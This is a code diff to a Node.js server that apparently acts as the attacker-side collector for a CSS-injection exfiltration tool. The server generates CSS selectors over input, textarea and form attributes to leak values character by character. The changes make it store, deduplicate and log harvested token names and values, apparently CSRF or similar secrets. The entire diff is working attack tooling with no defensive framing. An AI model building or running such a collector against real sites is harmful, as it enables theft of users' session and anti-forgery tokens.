@@ -5,7 +5,7 @@ const port = 5001;
 const HOSTNAME = "http://localhost:5001";
 const ELEMENTS = ["input","textarea","form"];
 const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name"],"form":["action"]};
-const MAX_ELEMENTS = 4;
+const MAX_ELEMENTS = 1;
 const MAX_VALUE = 50;
 const WAIT_TIME_MS = 250;
 
@@ -17,7 +17,10 @@ var tokens = [], foundToken = false;
 
 const requestHandler = (request, response) => {
     let req = url.parse(request.url, url);
-    if (stop) return response.end();
+    if (stop) {
+        completed();
+        return response.end();
+    }
     switch (req.pathname) {
         case "/start":
             n = 0;
@@ -58,13 +61,19 @@ const requestHandler = (request, response) => {
                         foundToken = false;
                     } else {
                         stop = true;
+                        completed();
                     }
                 }            
             }, WAIT_TIME_MS);
         break;
-        case "/end":        
-            console.log('[+] END:', req.query.tokenName, req.query.tokenValue); 
+        case "/end":   
+            let tokenName = req.query.tokenName;
+            let tokenValue = req.query.tokenValue;
+            if(!hasToken(tokenName,tokenValue)) {
+                tokens.push({tokenName, tokenValue});
+            }
             if(stop) {
+                completed();
                 response.end();   
             }
         default:
@@ -90,7 +99,7 @@ const genResponse = (response) => {
     }
     if(n === 0) {  
         for(let element of ELEMENTS) {
-            for(let attribute of ATTRIBUTES[element]) { 
+            for(let attribute of ATTRIBUTES[element]) {         
                 for(let i=0;i<MAX_ELEMENTS;i++) { 
                     for(let j=0;j<MAX_VALUE;j++) {         
                         const variablePrefix = '--'+element+'-'+attribute+'-'+i+'-'+j;  
@@ -118,4 +127,12 @@ server.listen(port, (err) => {
 
 function escapeCSS(str) {
     return str.replace(/(["\\])/,'\\$1');
+}
+
+function hasToken(tokenName, tokenValue) {
+    return tokens.find(tokenObject => tokenName === tokenObject.tokenName && tokenValue === tokenObject.tokenValue);
+}
+
+function completed() {
+    console.log("Completed.", tokens);
 }
